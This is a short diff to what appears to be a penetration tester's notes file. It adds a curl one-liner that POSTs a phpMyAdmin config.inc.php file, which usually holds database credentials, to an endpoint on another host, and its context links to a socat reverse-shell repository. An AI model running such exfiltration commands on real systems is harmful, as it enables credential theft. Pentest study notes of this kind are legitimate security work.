@@ -36,3 +36,6 @@ fusermount -u /mnt
 
 
 https://github.com/cornerpirate/socat-shell
+
+Post with curl
+curl -X POST -F "file=./phpmy/config.inc.php" http://192.168.118.196/test.php
